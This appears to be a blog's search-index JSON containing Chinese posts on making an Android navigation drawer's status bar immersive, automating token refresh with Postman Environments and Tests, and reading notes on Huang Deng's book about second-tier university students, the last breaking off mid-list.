android:layout_width=\u0026#34;wrap_content\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:layout_gravity=\u0026#34;bottom|end\u0026#34; android:layout_marginEnd=\u0026#34;@dimen/fab_margin\u0026#34; android:layout_marginBottom=\u0026#34;16dp\u0026#34; app:srcCompat=\u0026#34;@android:drawable/ic_dialog_email\u0026#34; /\u0026gt; \u0026lt;/androidx.coordinatorlayout.widget.CoordinatorLayout\u0026gt; 效果：\n修改 activity_main.xml，给 com.google.android.material.navigation.NavigationView 增加上 app:insetForeground=\u0026quot;@android:color/transparent\u0026quot;，去除抽屉状态栏浅色阴影， 效果：\n兼容深色模式 切换到深色模式的效果： 修改：night/themes.xml\n将 android:statusBarColor 设置为：@android:color/transparent\n\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@android:color/transparent\u0026lt;/item\u0026gt; 打开抽屉发现，这个时候状态栏已经透明了，但是状态栏背景还是会有一个黑色的背景色\n修改 app_bar_main.xml，在 \u0026lt;com.google.android.material.appbar.AppBarLayout 中增加背景色，就可以了\nandroid:background=\u0026#34;?attr/colorPrimary\u0026#34; 最终效果：\nfitsSystemWindows 属性 android:fitsSystemWindows=\u0026quot;true\u0026quot; 的官方文档描述：\nBoolean internal attribute to adjust view layout based on system windows such as the status bar. If true, adjusts the padding of this view to leave space for the system windows. Will only take effect if this view is in a non-embedded activity.\n对某个 View 设置 fitsSystemWindows 为 true，本质就是给这个 View 设置了 padding，所以在 app_bar_main.xml 的 AppBarLayout 设置 fitsSystemWindows，这样可以使得 AppBarLayout 的背景可以通过 padding 延展到状态栏，通过对 AppBarLayout 设置背景，就可以到达沉浸状态栏的效果\n其他常用配置 设置状态栏为浅色模式（文字为黑字） 代码：\nval controller = ViewCompat.getWindowInsetsController(binding.root) controller?.isAppearanceLightStatusBars = true 或者使用主题 xml 来定义：\n\u0026lt;item name=\u0026#34;android:windowLightStatusBar\u0026#34;\u0026gt;true\u0026lt;/item\u0026gt; 参考资料 深色主题背景 What exactly does fitsSystemWindows do? No Action Bar \u0026amp; Transparent Status Bar Android沉浸式状态栏(透明状态栏)最佳实现 透明状态栏、全屏应用、沉浸模式 NavigationView阴影 定制你的Toolbar Android 的style和theme\n","permalink":"https://aaronlinv.github.io/posts/%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89-navigation-drawer-%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/","summary":"\u003cp\u003e在使用 Navigation Drawer Activity 模版的时候，遇到了通知栏无法完全沉浸的问题，尝试搜索一些现有的解决方法，但是或多或少都会存在一些问题，通过反复尝试找到找到了一种比较靠谱的思路\u003c/p\u003e\n\u003ch2 id=\"环境\"\u003e环境\u003c/h2\u003e\n\u003cp\u003e测试模拟器：Pixel 3A\u003c/p\u003e\n\u003cp\u003ecompileSdk：32\u003c/p\u003e\n\u003cp\u003eminSdk：28\u003c/p\u003e\n\u003cp\u003etargetSdk：32\u003c/p\u003e\n\u003ch3 id=\"创建工程\"\u003e创建工程\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89NavigationDrawer%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/1929786-20220509210514734-1960395499.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"../%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89NavigationDrawer%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/1929786-20220509210525579-2009840573.png\"\u003e\u003c/p\u003e\n\u003ch3 id=\"默认效果展示\"\u003e默认效果展示：\u003c/h3\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89NavigationDrawer%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/1929786-20220509210614755-1486958964.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"../%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89NavigationDrawer%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/1929786-20220509210619669-753508730.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"修改步骤\"\u003e修改步骤\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e设置状态栏变为透明：修改主题配置\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e \u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34; tools:targetApi=\u0026#34;l\u0026#34;\u0026gt;?attr/colorPrimaryVariant\u0026lt;/item\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改为：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e\u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@android:color/transparent\u0026lt;/item\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e修改后完整文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-diff\" data-lang=\"diff\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;resources\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;!-- Base application theme. --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;style name=\u0026#34;Theme.MyApplication\u0026#34; parent=\u0026#34;Theme.MaterialComponents.DayNight.DarkActionBar\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;!-- Primary brand color. --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;colorPrimary\u0026#34;\u0026gt;@color/purple_500\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;colorPrimaryVariant\u0026#34;\u0026gt;@color/purple_700\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;colorOnPrimary\u0026#34;\u0026gt;@color/white\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;!-- Secondary brand color. --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;colorSecondary\u0026#34;\u0026gt;@color/teal_200\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;colorSecondaryVariant\u0026#34;\u0026gt;@color/teal_700\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;colorOnSecondary\u0026#34;\u0026gt;@color/black\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;!-- Status bar color. --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gi\"\u003e+       \u0026lt;item name=\u0026#34;android:statusBarColor\u0026#34;\u0026gt;@android:color/transparent\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"gi\"\u003e\u003c/span\u003e        \u0026lt;!-- Customize your theme here. --\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/style\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;style name=\u0026#34;Theme.MyApplication.NoActionBar\u0026#34;\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;windowActionBar\u0026#34;\u0026gt;false\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;item name=\u0026#34;windowNoTitle\u0026#34;\u0026gt;true\u0026lt;/item\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;/style\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;style name=\u0026#34;Theme.MyApplication.AppBarOverlay\u0026#34; parent=\u0026#34;ThemeOverlay.AppCompat.Dark.ActionBar\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;style name=\u0026#34;Theme.MyApplication.PopupOverlay\u0026#34; parent=\u0026#34;ThemeOverlay.AppCompat.Light\u0026#34; /\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/resources\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改后的效果：\n\u003cimg loading=\"lazy\" src=\"../%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89NavigationDrawer%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/1929786-20220509210630970-1651493127.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"../%E5%AE%89%E5%8D%93%E5%AF%BC%E8%88%AA%E6%8A%BD%E5%B1%89NavigationDrawer%E5%AE%9E%E7%8E%B0%E6%B2%89%E6%B5%B8%E9%80%9A%E7%9F%A5%E6%A0%8F/1929786-20220509210636209-924413269.png\"\u003e\u003c/p\u003e","title":"安卓导航抽屉 Navigation Drawer 实现沉浸通知栏"},{"content":"调试 API 的时候，我们需要经常需要在本地、开发、生产来回切换，还需要面临 Token 失效等的问题，让人头大，看到一些教程有介绍用 Postman 来简化流程，但是实践起来还是遇到一些问题，所以就有了这篇细致地介绍使用 Postman 的 Environments 和 Tests 来简化在不同环境中切换的步骤，无感知地调试 API 的博客\n手动更新 Token 在 Environments 面板中 new 一个新的 Environment (环境)，用于存储当前环境的：Token、地址、用户名、密码，需要先填上地址、用户名、密码的 CURRENT VALUE 在 Collections 中添加一个新的 Collection（集合），名字为 Demo，点击右键选择 Add Request 添加一个获取 Token 的 Request。注意右上角的 Environment 需要选择刚才定义的，这样才可以通过 {{}} 获取到 Environment 中变量的值。这里的 base URL、账号、密码都可以根据实际请求的情况进行设置 编写这个 Request 的 Test（Test会在请求执行后自动运行），编写 Test 目的是为了在请求后自动更新当前 Environment 的 Token，写完就点击 Send 发送请求。点击右上角的眼睛，可以快速查看当前 Environment 变量 // 判断相应的状态码是否为 200 pm.test(\u0026#34;Status code is 200\u0026#34;, function () { console.log((pm.response)) pm.response.to.have.status(200); }); // 更新当前 Environment 的 Token console.log(pm.response.json()) var token = pm.response.json().token pm.environment.set(\u0026#34;token\u0026#34;, token); 使用 Request 调用获取 Token 的 Request，更新全局 Token\n选择 Collection，然后选择 Edit\n给整个 Collection 都设置上统一的 Authorization，Type 设置为 Bearer Token，Token 值则设置为 {{token}}，就是上面设置进 Environment 的变量 新建一个 Request，Authorization 选择 Inherit auth from parent (继承父级的 auth)，这样就可以避免手动填写 Token 了 之后再使用就可以直接点击 Duplicate，复制一个新的 Request 来使用 自动更新 Token 在切换 Environment 或者 Token 失效的时候，我们都要手动调用获取 Token 的 Request，还是比较麻烦，我们可以进一步自动化，给整个 Collection 都设置上统一的 Test，Collection 的任一 Request 的响应体的状态码为 401 (Unauthorized)，就重新去获取并更新 Token\n选择 Collection，然后选择 Edit，编辑 Tests // 定义发送登录请求的方法 function sendLoginRequest() { // 定义请求体 var data = { \u0026#34;password\u0026#34;: pm.environment.get(\u0026#34;password\u0026#34;), \u0026#34;telephone\u0026#34;: pm.environment.get(\u0026#34;username\u0026#34;) } console.log(data) // 构造一个 POST 请求 var baseUrl = pm.environment.get(\u0026#34;base_url\u0026#34;) const loginRequest = { url: baseUrl + \u0026#39;/admin_access_tokens\u0026#39;, method: \u0026#39;POST\u0026#39;, header: \u0026#39;Content-Type:application/json\u0026#39;, body: { mode: \u0026#39;raw\u0026#39;, raw: JSON.stringify(data) } }; // 发送请求 pm.sendRequest(loginRequest, function (err, res) { if (err) { console.log(\u0026#34;err：\u0026#34; + err); } else { const jsonData = res.json(); // 自动更新 Collection 的 Token console.log(\u0026#34;获取到的 token：\u0026#34; + jsonData.token) var token = jsonData.token pm.environment.set(\u0026#34;token\u0026#34;, token); console.log(\u0026#34;更新全局变量 token 成功\u0026#34;) } }); } if (pm.response.code === 401) { // 如果当前返回的状态码是 401，就更新 token sendLoginRequest() } 这样一来，如果 Token 错误，它会自动重新获取并更新 Token，只需要再点一次 Send 就可以正常请求了 原理就是这个样子，如果想在不同环境中自由切换，只需要定义多个 Environment 即可，使用时只需要在右上角就可以轻松切换。如果想每次请求都直接去获取新 Token 也可以用 Pre-request Script；登录是带验证码的也可以参考：关于若依需要验证码，PostMan是如何登陆流程，总而言之，用上了这个 Tips 之后幸福感 up up up\n参考资料 Learning Center - Postman Postman 使用小技巧/指南 postman 一个也许可以节省你大量时间的小技巧 Postman设置全局变量token，自动更新token，统一设置headers(Authorization) Postman在pre-request Script中执行登录获取token\n推荐阅读： 开源≠免费 常见开源协议介绍 简单的 Shell 脚本入门教程 Docker 实践及命令梳理\n","permalink":"https://aaronlinv.github.io/posts/%E4%BD%BF%E7%94%A8-postman-%E7%9A%84-environments-%E5%92%8C-tests-%E7%AE%80%E5%8C%96%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%88%87%E6%8D%A2%E6%AD%A5%E9%AA%A4/","summary":"\u003cp\u003e调试 API 的时候，我们需要经常需要在本地、开发、生产来回切换，还需要面临 Token 失效等的问题，让人头大，看到一些教程有介绍用 Postman 来简化流程，但是实践起来还是遇到一些问题，所以就有了这篇细致地介绍使用 Postman 的 \u003ccode\u003eEnvironments\u003c/code\u003e 和 \u003ccode\u003eTests\u003c/code\u003e 来简化在不同环境中切换的步骤，无感知地调试 API 的博客\u003c/p\u003e\n\u003ch1 id=\"手动更新-token\"\u003e手动更新 Token\u003c/h1\u003e\n\u003col\u003e\n\u003cli\u003e在 \u003ccode\u003eEnvironments\u003c/code\u003e 面板中 \u003ccode\u003enew\u003c/code\u003e 一个新的 \u003ccode\u003eEnvironment\u003c/code\u003e (环境)，用于存储当前环境的：Token、地址、用户名、密码，需要先填上地址、用户名、密码的 \u003ccode\u003eCURRENT VALUE\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../%E4%BD%BF%E7%94%A8Postman%E7%9A%84Environments%E5%92%8CTests%E7%AE%80%E5%8C%96%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%88%87%E6%8D%A2%E6%AD%A5%E9%AA%A4/1929786-20220303220102144-1179572122.png\"\u003e\u003c/p\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003e在 \u003ccode\u003eCollections\u003c/code\u003e 中添加一个新的 \u003ccode\u003eCollection\u003c/code\u003e（集合），名字为 Demo，点击右键选择 \u003ccode\u003eAdd Request\u003c/code\u003e 添加一个获取 Token 的 Request。注意右上角的 Environment 需要选择刚才定义的，这样才可以通过 \u003ccode\u003e{{}}\u003c/code\u003e 获取到 Environment 中变量的值。这里的 base URL、账号、密码都可以根据实际请求的情况进行设置\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../%E4%BD%BF%E7%94%A8Postman%E7%9A%84Environments%E5%92%8CTests%E7%AE%80%E5%8C%96%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%88%87%E6%8D%A2%E6%AD%A5%E9%AA%A4/1929786-20220303220109252-1239737981.png\"\u003e\u003c/p\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e编写这个 \u003ccode\u003eRequest\u003c/code\u003e 的 \u003ccode\u003eTest\u003c/code\u003e（Test会在请求执行后自动运行），编写 \u003ccode\u003eTest\u003c/code\u003e 目的是为了在请求后自动更新当前 Environment 的 Token，写完就点击 \u003ccode\u003eSend\u003c/code\u003e 发送请求。点击右上角的眼睛，可以快速查看当前 Environment 变量\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../%E4%BD%BF%E7%94%A8Postman%E7%9A%84Environments%E5%92%8CTests%E7%AE%80%E5%8C%96%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%88%87%E6%8D%A2%E6%AD%A5%E9%AA%A4/1929786-20220303220124010-2012060462.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 判断相应的状态码是否为 200\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003epm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Status code is 200\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003epm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003epm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eto\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehave\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 更新当前 Environment 的 Token\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003epm\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenvironment\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;token\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"使用-request\"\u003e使用 Request\u003c/h1\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e调用获取 Token 的 \u003ccode\u003eRequest\u003c/code\u003e，更新全局 Token\u003c/p\u003e","title":"使用 Postman 的 Environments 和 Tests 简化在不同环境中的切换步骤"},{"content":"第一次知道黄灯老师是在随机波动的播客：【随机波动025】一本二本的尽头是否都是就业零件？\n后面又在软工教学群里看到了分享：专访《我的二本学生》作者黄灯：看见中国普通年轻人的命运\n随后也看到了十三幺：许知远对话黄灯 我和我的二本学生 以及黄灯老师的演讲：黄灯：二本学生的困境，也是当下所有年轻人的危机\n近期翻阅了黄灯老师所写的这本札记，对于所提到学生有了更具象的了解，书中一些片段与生活认知有高度的重叠，其中就包括：苦难对于学生不同的影响、原生家庭对于孩子成长的影响、大的时代背景下的个体的选择和命运、多子女家庭和独生子女家庭学生性格的差异\n看这本书的时候，我总会回想起大学时期担任软件工程助教的那些事情。通过助教这个工作，有幸以另一种角度窥见自己所在的学校、自己熟悉的课堂，见证同学们学习的状态。在结束了一个学期的助教工作后，我越发了解同学们的所面临的境况，同时也更深刻地感受到了教师的无奈，以及他们所面临的困境。对于我来说有时这种绝望是打在身上的，能够触及的改变太少了\n正如黄灯老师所说的：\n我希望我的学生毕业之后都能在社会上立足，不要过着很艰难的生活 我也希望他们更有冲劲，能够去追求梦想，有更多的勇气，但我知道其实很多爸爸妈妈，他们希望自己的孩子读完大学之后有一份稳定的工作，让父母放心，在城里面立足\n我也看到有不少学生，在坚持自己的理想和底线的时候，在现实中会碰的头破血流 我们作为过来人其实在他准备那样去做的时候就能够预料到他的后果，但是当时可能也不忍心去把他的那种激情破灭，但是事实上你过了好多年，再回过头去看其实孩子还是付出很大的代价\n这个社会的反，抗不能完全由年轻人冲到前面，我觉得这个社会的改革应该首先从反省自己开始，尤其是那些获得利益的人 一个农村来的孩子，父母通过打工，在外面卖苦力来供养他读书，说句不好听的，你指望他来改变这个社会，我觉得太残酷了\n互相看见是特别重要的，互相看见才会达成和解，这社会才会产生一种韧性的力量，而不是动不动就撕裂\n序言 看见他们 中国二本院校的学生，从某种程度而言，折射了中国最多数普通年轻人的状况，他们的命运，勾画出了中国年轻群体最为常见的成长路径\n写作的直接动因：课上的关于风的现场写作所引出的故事，让作者意识到了自己对于广东经济发展刻板印象\n一 在龙洞 龙洞的变化折射了城市变迁史 不同的学生毕业后都租住在龙洞，伟福将住所收拾的妥帖，让人舒坦，在结束一天的工作后，能拥有让自己享受的空间 冉辛追将龙洞作为人生过渡期的暂居之处，受到爷爷的影响，对文学骨子里地热爱，最后却选择了人力资源专业，他的选择让爷爷迷茫和失望，这种遗憾也成为了他人生选择的隐秘动力，父母支持考研，提供生活费，通过三年的努力，最终成为复旦的一员。与之相似的还有姚大顺，他们都没有办法按照生活预设好的轨道前行，所以最终选择了考研，但家庭和成长环境不同，导致了大顺无法接受家人资助，全心考研。经过折腾最后回到了龙洞，他是家中的长子，母亲希望他可以稳定下来\n除了身份已变，他的生活，和学生时代没有太大的不同，他依旧拥有龙洞，拥有学校的操场，拥有活色生香的饭堂，当然，也拥有大学时代低廉的生活成本，甚至还可以非常方便地联系想见的老师。这种便捷也许会让他忘记现实的残酷，淡化母亲给予他的忧伤，让他偶然沉湎咋学生时代的幻梦中\n二 公共课 公共课所教授的《经济应用文写作》与博士期间所学习的写作之间的鸿沟是面临的挑战\n对于人文学科而言，多媒体对于课堂的干扰和伤害，先让没有引起足够的重视，信息的泛滥及花里胡哨的内容，让老师无形中倍感压迫，也让学生在深度思考和理解上，缺乏锻炼的机会和耐心\n邓桦真 《风》 写自己家境的贫寒，为贷款烦透心 朱洁韵 《父爱》 个性要强，来到大学后，幡然醒悟懂得了父亲的爱\n面临的一个问题：无法触及一个真实群体的问题，企图借助考试，调动他们与己有关的生活经验，以此了解他们对于社会、自身的认知\n让学生困惑的事情：\n电子产品对生活的渗透 负载在家庭之上的生存挣扎 城市孩子：批判应式教育，深恶痛绝，刘奕晓比喻为“一场赌博”，方雪怡：高考作为划分线，中国学生的青春时代被简单粗暴地划分成两部分 农村孩子：充满闯过高考的庆幸惴惴不安\n正因为经受了压力过大的考试阶段，课堂上学生中规中矩、老成持重，他们的平和中正与我们大学时代的张扬放肆，鲜明对比。他们收缩了属于青春年代的触角和锋芒，逼到绝境，唯一能够下手的对象只有自己\n从记事起，无形的、细密的重荷就负载在他们身上，早已将他们裁剪得规规整整，难以在生活中泄露狡黠的契机\n教育像一场慢性炎症，中小学时代服下的猛药、抗生素、激素，到了大学时代，终于结下了漠然、无所谓、不思考、不主动的恶果\n三 班主任 因为班主任的身份，目睹了一个群体从学生时代，完全步入真实的社会，并和这个社会产生真实的关联\n这些二本学生有的是在毕业后短暂挣扎，但最后又是为了解决生存\n梦想，每个人都应该拥有，但不是每个人都能实现 大学毕业后，我的首要任务是要解决我和家人的生活问题\n四任班长，其中能几个之所以能在社会立足，并过上让长辈放心、安心的稳定生活，要不就是早早认清现实的规划顺着社会去经营生活，要么就是是经过现实的碰撞，终于认清进入体制内工作的优势，选择毕业后回炉考公务员。志勇综合条件优秀，但是毕业后九年经历证明了，现实已经没有多少空间和可能\n夹缝中的光芒： 钟梦兰：得益于中国高速的城市化进程，父亲从事建筑行业，在市里购地建房，在小城市生活 潘海燕：父母进城打工，保证了三姊妹的教育费用，没有重蹈村里贫困家庭长女的遭遇，早早辍学嫁人 广东发达经济条件和成熟的市场意识，导致家庭开过工厂或小作坊和内地农村家庭依赖农业的鲜明对比，造成职业观念的不同：倾向于从事商业活动\n062111毕业生去向： 